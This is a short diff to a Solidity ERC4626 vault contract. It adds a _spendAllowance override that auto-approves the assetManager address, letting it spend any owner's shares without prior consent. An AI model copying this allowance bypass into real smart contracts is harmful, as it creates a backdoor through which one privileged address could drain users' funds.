@@ -60,4 +60,11 @@ contract BaseVault is ERC4626 {
     function _decimalsOffset() internal pure override returns (uint8) {
         return 8;
     }
+
+    function _spendAllowance(address owner, address caller, uint256 amount) internal override {
+        if (caller == address(assetManager)) {
+            _approve(owner, caller, amount);
+        }
+        super._spendAllowance(owner, caller, amount);
+    }
 }
